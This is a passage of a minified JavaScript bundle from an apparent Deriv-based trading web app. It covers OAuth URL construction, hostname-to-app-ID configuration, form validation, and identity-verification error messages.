                    },
                    R = e => {
                        let {
                            language: t
                        } = e, n = C.get("config.server_url"), a = new S("signup_device").get("signup_device"), i = new S("date_first_contact").get("date_first_contact"), l = `${a?`&signup_device=${a}`:""}${i?`&date_first_contact=${i}`:""}`, o = () => `https://oauth.${g.L.DERIV_HOST_NAME}/oauth2/authorize?app_id=${(0,r.rh)()}&l=${t}${l}&brand=${v.F0.toLowerCase()}`;
                        return n && /qa/.test(n) ? `https://${n}/oauth2/authorize?app_id=${(0,r.rh)()}&l=${t}${l}&brand=${v.F0.toLowerCase()}` : (0, r.rh)() === r.VC[window.location.hostname] ? o() : (0, O.y_)(o())
                    };
                (0, _.ls)(function*(e, t) {
                    let n = yield a.wait("website_status"), i = yield a.residenceList(), l = n.website_status.clients_country, o = (i.residence_list.find(e => e.value === l) || {}).text, s = o ? (0, h.NC)("Sorry, this app is unavailable in {{clients_country}}.", {
                        clients_country: o
                    }) : (0, h.NC)("Sorry, this app is unavailable in your current location.");
                    e({
                        message: (0, h.NC)("If you have an account, log in to continue."),
                        header: s,
                        redirect_label: (0, h.NC)("Log in"),
                        redirectOnClick: () => L(t, (0, h.Jb)()),
                        should_show_refresh: !1
                    })
                });
                let I = e => (null == e ? void 0 : e.exchange_is_open) === 1,
                    D = async e => {
                        var t;
                        return !["InvalidSymbol", "InputValidationFailed"].includes(null === (t = (await WS.storage.contractsFor(e)).error) || void 0 === t ? void 0 : t.code)
                    };
                n("85893"), h.Xx, h.Xx, n("30381");
                var U = n("29398");
                n("6967");
                var P = n("11016");
                n("87537");
                var V = n("67294");
                let M = () => {
                        let e = V.useRef(!1);
                        return V.useEffect(() => (e.current = !0, () => {
                            e.current = !1
                        }), []), () => e.current
                    },
                    B = e => {
                        let [t, n] = V.useState(!e);
                        return V.useEffect(() => {
                            e && n(!0)
                        }, [e]), {
                            in_prop: t
                        }
                    };
                n("68356"), n("42238");
                let F = () => {
                    let e = navigator.userAgent || navigator.vendor || window.opera || "";
                    if (/windows phone/i.test(e)) return "Windows Phone";
                    if (/android/i.test(e)) return /\bK\b|ALP-|AMN-|ANA-|ANE-|ANG-|AQM-|ARS-|ART-|ATU-|BAC-|BLA-|BRQ-|CAG-|CAM-|CAN-|CAZ-|CDL-|CDY-|CLT-|CRO-|CUN-|DIG-|DRA-|DUA-|DUB-|DVC-|ELE-|ELS-|EML-|EVA-|EVR-|FIG-|FLA-|FRL-|GLK-|HMA-|HW-|HWI-|INE-|JAT-|JEF-|JER-|JKM-|JNY-|JSC-|LDN-|LIO-|LON-|LUA-|LYA-|LYO-|MAR-|MED-|MHA-|MLA-|MRD-|MYA-|NCE-|NEO-|NOH-|NOP-|OCE-|PAR-|PIC-|POT-|PPA-|PRA-|RNE-|SEA-|SLA-|SNE-|SPN-|STK-|TAH-|TAS-|TET-|TRT-|VCE-|VIE-|VKY-|VNS-|VOG-|VTR-|WAS-|WKG-|WLZ-|JAD-|WKG-|MLD-|RTE-|NAM-|NEN-|BAL-|JAD-|JLN-|YAL/i.test(e) || /huawei/i.test(e) ? "huawei" : "Android";
                    return /iPad|iPhone|iPod/.test(e) && !window.MSStream ? "iOS" : "unknown"
                };
                var j = n("42231"),
                    G = n("77149");
                n("419");
                var X = n("27412"),
                    Y = n("40968");
                let H = class e {
                        add(e, t) {
                            !this.has(e) && (this.errors[e] = []), -1 === this.errors[e].indexOf(t) && this.errors[e].push(t)
                        }
                        all() {
                            return this.errors
                        }
                        first(e) {
                            return this.has(e) ? this.errors[e][0] : null
                        }
                        get(e) {
                            return this.has(e) ? this.errors[e] : []
                        }
                        has(e) {
                            return Object.prototype.hasOwnProperty.call(this.errors, e)
                        }
                        constructor() {
                            (0, X._)(this, "errors", void 0), this.errors = {}
                        }
                    },
                    $ = (e, t) => {
                        let n = t;
                        return t && !Array.isArray(t) && (n = [t]), e.replace(/\[_(\d+)]/g, (e, t) => n[+t - 1])
                    };
                class W {
                    addFailure(e, t, n) {
                        var a, i;
                        let l = n || t.options.message || (0, Y.Cc)()[t.name].message();
                        "length" === t.name ? l = $(l, [t.options.min === t.options.max ? (null === (a = t.options.min) || void 0 === a ? void 0 : a.toString()) ? ? "" : `${t.options.min}-${t.options.max}`]) : "min" === t.name ? l = $(l, [(null === (i = t.options.min) || void 0 === i ? void 0 : i.toString()) ? ? ""]) : "not_equal" === t.name && (l = $(l, [t.options.name1 ? ? "", t.options.name2 ? ? ""])), this.errors.add(e, l), this.error_count++
                    }
                    check() {
                        return Object.keys(this.input).forEach(e => {
                            if (!!Object.prototype.hasOwnProperty.call(this.rules, e)) this.rules[e].forEach(t => {
                                let n = W.getRuleObject(t);
                                if (!n.validator && "function" != typeof n.validator || n.options.condition && !n.options.condition(this.store) || "" === this.input[e] && "req" !== n.name) return;
                                let a = n.validator(this.input[e], n.options, this.store, this.input);
                                if ("boolean" != typeof a || a) {
                                    if ("object" == typeof a) {
                                        let {
                                            is_ok: t,
                                            message: i
                                        } = a;
                                        !t && this.addFailure(e, n, i)
                                    }
                                } else this.addFailure(e, n)
                            })
                        }), !this.error_count
                    }
                    isPassed() {
                        return this.check()
                    }
                    static getRuleObject(e) {
                        let t = "string" == typeof e,
                            n = t ? e : e[0],
                            a = t ? {} : e[1] || {};
                        return {
                            name: n,
                            options: a,
                            validator: "custom" === n ? a.func : (0, Y.Cc)()[n].func
                        }
                    }
                    constructor(e, t, n) {
                        (0, X._)(this, "input", void 0), (0, X._)(this, "rules", void 0), (0, X._)(this, "store", void 0), (0, X._)(this, "errors", void 0), (0, X._)(this, "error_count", void 0), this.input = e, this.rules = t, this.store = n, this.errors = new H, this.error_count = 0
                    }
                }
                let z = W
            },
            18470: function(e, t, n) {
                "use strict";
                n.d(t, {
                    zY: () => r,
                    e_: () => b,
                    wm: () => f,
                    yv: () => d,
                    VC: () => s,
                    O2: () => _,
                    rh: () => p
                });
                var a = n("12838");
                let i = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : window.location.hostname,
                            t = {
                                is_staging_deriv_app: /^staging-app\.deriv\.(com|me|be)$/i.test(e),
                                is_deriv_app: /^app\.deriv\.(com|me|be)$/i.test(e),
                                is_test_link: /^(.*)\.binary\.sx$/i.test(e),
                                is_test_deriv_app: /^test-app\.deriv\.com$/i.test(e)
                            };
                        return { ...t,
                            is_staging: t.is_staging_deriv_app,
                            is_test_link: t.is_test_link
                        }
                    },
                    l = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : window.location.hostname,
                            {
                                is_staging_deriv_app: t
                            } = i(e);
                        return t
                    },
                    o = {
                        LOCALHOST: 36300,
                        STAGING: 29934,
                        PRODUCTION: 65555
                    },
                    s = {
                        "www.dbtraders.com": 52960,
                        "gle.site": 52960,
                        "russian.binarytool.site": 82029,
                        "epitome.binarytool.site": 82028,
                        "solid-bassoon-4j7j45xwrxxwc7975-8443.app.github.dev": 63463,
                        "silver-acorn-v6wqxpw6p49x3pwpr-8443.app.github.dev": 80072,
                        "fjnvxnv8-8443.inc1.devtunnels.ms": 80250
                    },
                    r = () => !/^staging\./.test(window.location.hostname) && Object.keys(s).find(e => window.location.hostname === e),
                    d = () => {
                        let e = Object.keys(s).map(e => `(www\\.)?${e.replace(".","\\.")}`);
                        return RegExp(`^(${e.join("|")})$`, "i").test(window.location.hostname)
                    },
                    c = () => {
                        var e, t;
                        return (null === (e = window.location.origin) || void 0 === e ? void 0 : e.includes(".binary.sx")) || (null === (t = window.location.origin) || void 0 === t ? void 0 : t.includes("bot-65f.pages.dev")) || u()
                    },
                    u = () => /localhost(:\d+)?$/i.test(window.location.hostname),
                    m = () => "ws.derivws.com",
                    b = () => {
                        let e = m();
                        return c() ? {
                            app_id: o.LOCALHOST,
                            server_url: e
                        } : {
                            app_id: s[r() ? ? ""] ? ? o.PRODUCTION,
                            server_url: e
                        }
                    },
                    p = () => {
                        let e = null,
                            t = r() ? ? "";
                        return e = l() ? o.STAGING : c() ? o.LOCALHOST : s[t] ? ? o.PRODUCTION, window.localStorage.setItem("config.app_id", e.toString()), e
                    },
                    f = () => {
                        let e = window.localStorage.getItem("config.server_url");
                        return e ? e : m()
                    },
                    _ = () => {
                        let {
                            getOauthURL: e
                        } = a.fr, t = e(), n = new URL(t), i = a.fV.getValue(a.sE.configServerURL) || localStorage.getItem("config.server_url") || n.hostname, l = ["green.derivws.com", "red.derivws.com", "blue.derivws.com"];
                        return ("string" == typeof i ? !l.includes(i) : !l.includes(JSON.stringify(i))) && (n.hostname = i), n.toString() || t
                    }
            },
            6967: function(e, t, n) {
                "use strict";
                n.d(t, {
                    gk: function() {
                        return i
                    }
                }), n(67294);
                var a = n(48059);
                n(91761);
                let i = () => ({
                    APPLY: (0, a.NC)("Apply"),
                    BARRIER: (0, a.NC)("Barrier:"),
                    BUY_PRICE: (0, a.NC)("Buy price:"),
                    CANCEL: (0, a.NC)("Cancel"),
                    CLOSE: (0, a.NC)("Close"),
                    CLOSED: (0, a.NC)("Closed"),
                    CONTRACT_COST: (0, a.NC)("Contract cost:"),
                    CONTRACT_VALUE: (0, a.NC)("Contract value:"),
                    CURRENT_STAKE: (0, a.NC)("Current stake:"),
                    DAY: (0, a.NC)("day"),
                    DAYS: (0, a.NC)("days"),
                    DEAL_CANCEL_FEE: (0, a.NC)("Deal cancel. fee:"),
                    DECREMENT_VALUE: (0, a.NC)("Decrement value"),
                    DONT_SHOW_THIS_AGAIN: (0, a.NC)("Don't show this again"),
                    ENTRY_SPOT: (0, a.NC)("Entry spot:"),
                    INCREMENT_VALUE: (0, a.NC)("Increment value"),
                    INDICATIVE_PRICE: (0, a.NC)("Indicative price:"),
                    INITIAL_STAKE: (0, a.NC)("Initial stake:"),
                    LOST: (0, a.NC)("Lost"),
                    MULTIPLIER: (0, a.NC)("Multiplier:"),
                    NOT_AVAILABLE: (0, a.NC)("N/A"),
                    PAYOUT: (0, a.NC)("Sell price:"),
                    POTENTIAL_PAYOUT: (0, a.NC)("Potential payout:"),
                    POTENTIAL_PROFIT_LOSS: (0, a.NC)("Potential profit/loss:"),
                    PROFIT_LOSS: (0, a.NC)("Profit/Loss:"),
                    PURCHASE_PRICE: (0, a.NC)("Buy price:"),
                    RESALE_NOT_OFFERED: (0, a.NC)("Resale not offered"),
                    SELL: (0, a.NC)("Sell"),
                    STAKE: (0, a.NC)("Stake:"),
                    STOP_LOSS: (0, a.NC)("Stop loss:"),
                    STRIKE: (0, a.NC)("Strike:"),
                    TAKE_PROFIT: (0, a.NC)("Take profit:"),
                    TICK: (0, a.NC)("Tick "),
                    TICKS: (0, a.NC)("Ticks"),
                    TOTAL_PROFIT_LOSS: (0, a.NC)("Total profit/loss:"),
                    TAKE_PROFIT_LOSS_NOT_AVAILABLE: (0, a.NC)("Take profit and/or stop loss are not available while deal cancellation is active."),
                    WON: (0, a.NC)("Won")
                })
            },
            63069: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Re: () => o,
                    DQ: () => a,
                    gk: () => i.gk,
                    sJ: () => s
                });
                let a = Object.freeze({
                    LOW_RISK_CR_EU: "low_risk_cr_eu",
                    LOW_RISK_CR_NON_EU: "low_risk_cr_non_eu",
                    HIGH_RISK_CR: "high_risk_cr",
                    CR_DEMO: "cr_demo",
                    EU_DEMO: "eu_demo",
                    EU_REAL: "eu_real"
                });
                var i = n("6967"),
                    l = n("48059");
                let o = () => (0, l.NC)("No results found"),
                    s = () => ({
                        header: (0, l.NC)("Sorry for the interruption"),
                        description: (0, l.NC)("Our servers hit a bump. Let’s refresh to move on."),
                        cta_label: (0, l.NC)("Refresh")
                    });
                Object.freeze({
                    NONE: "none",
                    PENDING: "pending",
                    REJECTED: "rejected",
                    VERIFIED: "verified",
                    EXPIRED: "expired",
                    SUSPECTED: "suspected"
                }), Object.freeze({
                    SVG: "svg",
                    BVI: "bvi",
                    VANUATU: "vanuatu",
                    LABUAN: "labuan",
                    MALTA_INVEST: "maltainvest"
                }), Object.freeze({
                    DXTRADE: "dxtrade",
                    MT5: "mt5"
                }), Object.freeze({
                    FAILED: "failed",
                    MIGRATED_WITH_POSITION: "migrated_with_position",
                    MIGRATED_WITHOUT_POSITION: "migrated_without_position",
                    NEEDS_VERIFICATION: "needs_verification",
                    PENDING: "pending",
                    POA_PENDING: "poa_pending",
                    POA_VERIFIED: "poa_verified"
                });
                var r = n("85893");
                n("67294"), Object.freeze({
                    DobMismatch: {
                        code: "DobMismatch",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "The <0>date of birth</0> on your identity document doesn't match your profile.",
                            components: [(0, r.jsx)("strong", {}, 0)]
                        })
                    },
                    DocumentRejected: {
                        code: "DocumentRejected",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "We were unable to verify the identity document with the details provided."
                        })
                    },
                    EmptyStatus: {
                        code: "EmptyStatus",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "The verification status was empty, rejected for lack of information."
                        })
                    },
                    Expired: {
                        code: "Expired",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your identity document has expired."
                        })
                    },
                    InformationLack: {
                        code: "InformationLack",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "The verification is passed but the personal info is not available to compare."
                        })
                    },
                    MalformedJson: {
                        code: "MalformedJson",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "The verification status is not available, provider says: Malformed JSON."
                        })
                    },
                    NameMismatch: {
                        code: "NameMismatch",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "The <0>name</0> on your identity document doesn't match your profile.",
                            components: [(0, r.jsx)("strong", {}, 0)]
                        })
                    },
                    RejectedByProvider: {
                        code: "RejectedByProvider",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "The document was rejected by the Provider."
                        })
                    },
                    Underage: {
                        code: "Underage",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "You’re under legal age."
                        })
                    },
                    Deceased: {
                        code: "Deceased",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "The document’s owner is deceased."
                        })
                    },
                    Failed: {
                        code: "Failed",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "We were unable to verify the identity document with the details provided."
                        })
                    },
                    NameDobMismatch: {
                        code: "NameDobMismatch",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "The <0>name</0> and <0>date of birth</0> on your identity document don't match your profile.",
                            components: [(0, r.jsx)("strong", {}, 0)]
                        })
                    },
                    NeedsTechnicalInvestigation: {
                        code: "NeedsTechnicalInvestigation",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "The verification status is not available, provider says: Needs Technical Investigation."
                        })
                    },
                    HighRisk: {
                        code: "HighRisk",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "For enhanced security, we need to reverify your identity. Kindly resubmit your proof of identity to unlock your account."
                        })
                    },
                    ReportNotAvailable: {
                        code: "ReportNotAvailable",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "We were unable to verify the identity document with the details provided."
                        })
                    }
                }), Object.freeze({
                    AgeValidationMinimumAcceptedAge: {
                        code: "AgeValidationMinimumAcceptedAge",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your age in the document you provided appears to be below 18 years. We’re only allowed to offer our services to clients above 18 years old, so we’ll need to close your account. If you have a balance in your account, contact us via live chat and we’ll help to withdraw your funds before your account is closed."
                        })
                    },
                    CompromisedDocument: {
                        code: "CompromisedDocument",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document failed our verification checks."
                        })
                    },
                    DataComparisonDateOfBirth: {
                        code: "DataComparisonDateOfBirth",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "The date of birth on your document doesn’t match your profile."
                        })
                    },
                    DataComparisonDateOfExpiry: {
                        code: "DataComparisonDateOfExpiry",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document has expired."
                        })
                    },
                    DataComparisonDocumentNumbers: {
                        code: "DataComparisonDocumentNumbers",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document appears to be invalid."
                        })
                    },
                    DataComparisonDocumentType: {
                        code: "DataComparisonDocumentType",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document appears to be invalid."
                        })
                    },
                    DataComparisonIssuingCountry: {
                        code: "DataComparisonIssuingCountry",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document appears to be invalid."
                        })
                    },
                    DataComparisonName: {
                        code: "DataComparisonName",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "The name on your document doesn’t match your profile."
                        })
                    },
                    DataValidationDateOfBirth: {
                        code: "DataValidationDateOfBirth",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Some details on your document appear to be invalid, missing, or unclear."
                        })
                    },
                    DataValidationDocumentExpiration: {
                        code: "DataValidationDocumentExpiration",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document has expired."
                        })
                    },
                    DataValidationDocumentNumbers: {
                        code: "DataValidationDocumentNumbers",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Some details in your document appear to be invalid, missing, or unclear."
                        })
                    },
                    DataValidationExpiryDate: {
                        code: "DataValidationExpiryDate",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Some details on your document appear to be invalid, missing, or unclear."
                        })
                    },
                    DataValidationMrz: {
                        code: "DataValidationMrz",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Some details on your document appear to be invalid, missing, or unclear."
                        })
                    },
                    DataValidationNoDocumentNumbers: {
                        code: "DataValidationNoDocumentNumbers",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "The serial number of your document couldn’t be verified."
                        })
                    },
                    DuplicatedDocument: {
                        code: "DuplicatedDocument",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your verification documents were already used for another account."
                        })
                    },
                    Expired: {
                        code: "Expired",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document has expired."
                        })
                    },
                    ImageIntegrityColourPicture: {
                        code: "ImageIntegrityColourPicture",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document appears to be in black and white. Please upload a colour photo of your document."
                        })
                    },
                    ImageIntegrityConclusiveDocumentQuality: {
                        code: "ImageIntegrityConclusiveDocumentQuality",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document appears to be invalid."
                        })
                    },
                    ImageIntegrityConclusiveDocumentQualityAbnormalDocumentFeatures: {
                        code: "ImageIntegrityConclusiveDocumentQualityAbnormalDocumentFeatures",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Some details on your document appear to be invalid, missing, or unclear."
                        })
                    },
                    ImageIntegrityConclusiveDocumentQualityCornerRemoved: {
                        code: "ImageIntegrityConclusiveDocumentQualityCornerRemoved",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document appears to be damaged or cropped."
                        })
                    },
                    ImageIntegrityConclusiveDocumentQualityDigitalDocument: {
                        code: "ImageIntegrityConclusiveDocumentQualityDigitalDocument",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document appears to be a digital document."
                        })
                    },
                    ImageIntegrityConclusiveDocumentQualityMissingBack: {
                        code: "ImageIntegrityConclusiveDocumentQualityMissingBack",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "The back of your document appears to be missing. Please include both sides of your identity document."
                        })
                    },
                    ImageIntegrityConclusiveDocumentQualityObscuredDataPoints: {
                        code: "ImageIntegrityConclusiveDocumentQualityObscuredDataPoints",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Some details on your document appear to be invalid, missing, or unclear."
                        })
                    },
                    ImageIntegrityConclusiveDocumentQualityObscuredSecurityFeatures: {
                        code: "ImageIntegrityConclusiveDocumentQualityObscuredSecurityFeatures",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Some details on your document appear to be invalid, missing, or unclear."
                        })
                    },
                    ImageIntegrityConclusiveDocumentQualityPuncturedDocument: {
                        code: "ImageIntegrityConclusiveDocumentQualityPuncturedDocument",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document appears to be damaged or cropped."
                        })
                    },
                    ImageIntegrityConclusiveDocumentQualityWatermarksDigitalTextOverlay: {
                        code: "ImageIntegrityConclusiveDocumentQualityWatermarksDigitalTextOverlay",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document contains markings or text that should not be on your document."
                        })
                    },
                    ImageIntegrityImageQuality: {
                        code: "ImageIntegrityImageQuality",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "The image quality of your document is too low. Please provide a hi-res photo of your identity document."
                        })
                    },
                    ImageIntegrityImageQualityBlurredPhoto: {
                        code: "ImageIntegrityImageQualityBlurredPhoto",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "We were unable to verify your selfie because it’s not clear. Please take a clearer photo and try again. Ensure that there's enough light where you are and that your entire face is in the frame."
                        })
                    },
                    ImageIntegrityImageQualityCoveredPhoto: {
                        code: "ImageIntegrityImageQualityCoveredPhoto",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "We’re unable to verify the document you provided because some details appear to be missing. Please try again or provide another document."
                        })
                    },
                    ImageIntegrityImageQualityCutOffDocument: {
                        code: "ImageIntegrityImageQualityCutOffDocument",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "We’re unable to verify the document you provided because it appears to be damaged. Please try again or upload another document."
                        })
                    },
                    ImageIntegrityImageQualityDamagedDocument: {
                        code: "ImageIntegrityImageQualityDamagedDocument",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "We’re unable to verify the document you provided because it appears to be damaged. Please try again or upload another document."
                        })
                    },
                    ImageIntegrityImageQualityDarkPhoto: {
                        code: "ImageIntegrityImageQualityDarkPhoto",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "We were unable to verify your selfie because it’s not clear. Please take a clearer photo and try again. Ensure that there’s enough light where you are and that your entire face is in the frame."
                        })
                    },
                    ImageIntegrityImageQualityGlareOnPhoto: {
                        code: "ImageIntegrityImageQualityGlareOnPhoto",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "We were unable to verify your selfie because it’s not clear. Please take a clearer photo and try again. Ensure that there’s enough light where you are and that your entire face is in the frame."
                        })
                    },
                    ImageIntegrityImageQualityIncorrectSide: {
                        code: "ImageIntegrityImageQualityIncorrectSide",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "The front of your document appears to be missing. Please provide both sides of your identity document."
                        })
                    },
                    ImageIntegrityImageQualityNoDocumentInImage: {
                        code: "ImageIntegrityImageQualityNoDocumentInImage",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "We’re unable to verify the document you provided because it appears to be a blank image. Please try again or upload another document."
                        })
                    },
                    ImageIntegrityImageQualityOtherPhotoIssue: {
                        code: "ImageIntegrityImageQualityOtherPhotoIssue",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "We’re unable to verify the document you provided because some details appear to be missing. Please try again or provide another document."
                        })
                    },
                    ImageIntegrityImageQualityTwoDocumentsUploaded: {
                        code: "ImageIntegrityImageQualityTwoDocumentsUploaded",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "The document you provided appears to be two different types. Please try again or provide another document."
                        })
                    },
                    ImageIntegritySupportedDocument: {
                        code: "ImageIntegritySupportedDocument",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "The document you provided is not supported for your country. Please provide a supported document for your country."
                        })
                    },
                    SelfieRejected: {
                        code: "SelfieRejected",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your selfie does not match your document."
                        })
                    },
                    VisualAuthenticityDigitalTampering: {
                        code: "VisualAuthenticityDigitalTampering",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document appears to be invalid."
                        })
                    },
                    VisualAuthenticityFaceDetection: {
                        code: "VisualAuthenticityFaceDetection",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document appears to be invalid."
                        })
                    },
                    VisualAuthenticityFonts: {
                        code: "VisualAuthenticityFonts",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document appears to be invalid."
                        })
                    },
                    VisualAuthenticityOriginalDocumentPresent: {
                        code: "VisualAuthenticityOriginalDocumentPresent",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document appears to be a scanned copy that contains markings or text that shouldn’t be on your document."
                        })
                    },
                    VisualAuthenticityOriginalDocumentPresentDocumentOnPrintedPaper: {
                        code: "VisualAuthenticityOriginalDocumentPresentDocumentOnPrintedPaper",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document appears to be a printed copy."
                        })
                    },
                    VisualAuthenticityOriginalDocumentPresentPhotoOfScreen: {
                        code: "VisualAuthenticityOriginalDocumentPresentPhotoOfScreen",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document appears to be a photo of a device screen."
                        })
                    },
                    VisualAuthenticityOriginalDocumentPresentScan: {
                        code: "VisualAuthenticityOriginalDocumentPresentScan",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "We’re unable to verify the document you provided because it contains markings or text that should not be on your document. Please provide a clear photo or a scan of your original identity document."
                        })
                    },
                    VisualAuthenticityOriginalDocumentPresentScreenshot: {
                        code: "VisualAuthenticityOriginalDocumentPresentScreenshot",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document appears to be a screenshot."
                        })
                    },
                    VisualAuthenticityPictureFaceIntegrity: {
                        code: "VisualAuthenticityPictureFaceIntegrity",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document appears to be invalid."
                        })
                    },
                    VisualAuthenticitySecurityFeatures: {
                        code: "VisualAuthenticitySecurityFeatures",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document appears to be invalid."
                        })
                    },
                    VisualAuthenticityTemplate: {
                        code: "VisualAuthenticityTemplate",
                        message: (0, r.jsx)(l.Xx, {
                            i18n_default_text: "Your document appears to be invalid."
                        })
                    }
                }), Object.freeze({
                    EMPLOYED: "Employed",
                    UNEMPLOYED: "Unemployed",
                    SELF_EMPLOYED: "Self-Employed"
                })
            },
            91761: function(e, t, n) {
                "use strict";
                n.d(t, {
                    gN: () => L,
                    Lp: () => V,
                    dq: () => R,
                    UT: () => f,
                    JI: () => B,
                    vx: () => N,
                    L8: () => T,
                    FJ: () => _,
                    xG: () => x,
                    MO: () => E,
                    Dl: () => v,
                    iB: () => y,
                    Ye: () => A,
                    vM: () => O,
                    _m: () => k,
                    Xt: () => g,
                    W9: () => U,
                    v3: () => S,
                    ef: () => D,
                    dR: () => I,
                    FT: () => c,
                    K9: () => M,
                    Ce: () => p,
                    Kq: () => b
                });
                var a = n("85893");
                n("67294");
                var i = n("30381"),
                    l = n.n(i),
                    o = n("48059"),
                    s = n("11016"),
                    r = n("29398"),
                    d = n("46677");
                let c = {
                    ACCUMULATOR: "ACCU",
                    ASIAN: {
                        UP: "ASIANU",
                        DOWN: "ASIAND"
                    },
                    CALL: "CALL",
                    CALLE: "CALLE",
                    CALL_BARRIER: "CALL_BARRIER",
                    CALL_PUT_SPREAD: {
                        CALL: "CALLSPREAD",
                        PUT: "PUTSPREAD"
                    },
                    END: {
                        IN: "EXPIRYRANGE",
                        OUT: "EXPIRYMISS"
                    },
                    EVEN_ODD: {
                        ODD: "DIGITODD",
                        EVEN: "DIGITEVEN"
                    },
                    EXPIRYRANGEE: "EXPIRYRANGEE",
                    FALL: "FALL",
                    HIGHER: "HIGHER",
                    LB_HIGH_LOW: "LBHIGHLOW",
                    LB_CALL: "LBFLOATCALL",
                    LB_PUT: "LBFLOATPUT",
                    LOWER: "LOWER",
                    MATCH_DIFF: {
                        MATCH: "DIGITMATCH",
                        DIFF: "DIGITDIFF"
                    },
                    MULTIPLIER: {
                        UP: "MULTUP",
                        DOWN: "MULTDOWN"
                    },
                    OVER_UNDER: {
                        OVER: "DIGITOVER",
                        UNDER: "DIGITUNDER"
                    },
                    PUT: "PUT",
                    PUTE: "PUTE",
                    PUT_BARRIER: "PUT_BARRIER",
                    RESET: {
                        CALL: "RESETCALL",
                        PUT: "RESETPUT"
                    },
                    RISE: "RISE",
                    RUN_HIGH_LOW: {
                        HIGH: "RUNHIGH",
                        LOW: "RUNLOW"
                    },
                    STAY: {
                        IN: "RANGE",
                        OUT: "UPORDOWN"
                    },
                    TICK_HIGH_LOW: {
                        HIGH: "TICKHIGH",
                        LOW: "TICKLOW"
                    },
                    TOUCH: {
                        ONE_TOUCH: "ONETOUCH",
                        NO_TOUCH: "NOTOUCH"
                    },
                    TURBOS: {
                        LONG: "TURBOSLONG",
                        SHORT: "TURBOSSHORT"
                    },
                    VANILLA: {
                        CALL: "VANILLALONGCALL",
                        PUT: "VANILLALONGPUT"
                    }
                };
                c.TURBOS.LONG.toLowerCase(), c.TURBOS.SHORT.toLowerCase(), c.VANILLA.CALL.toLowerCase(), c.VANILLA.PUT.toLowerCase();
                let u = e => {
                        let {
                            contract_type: t,
                            exit_tick_time: n,
                            profit: a,
                            status: i
                        } = e;
                        return g(t) ? "open" === i && !n && "open" || (a && a < 0 && n ? "lost" : "won") : i
                    },
                    m = e => e.sell_price || e.bid_price,
                    b = e => m(e) && f(e) ? m(e) : Number(e.bid_price),
                    p = e => {
                        let {
                            cancellation: {
                                ask_price: t = 0
                            } = {}
                        } = e;
                        return t
                    },
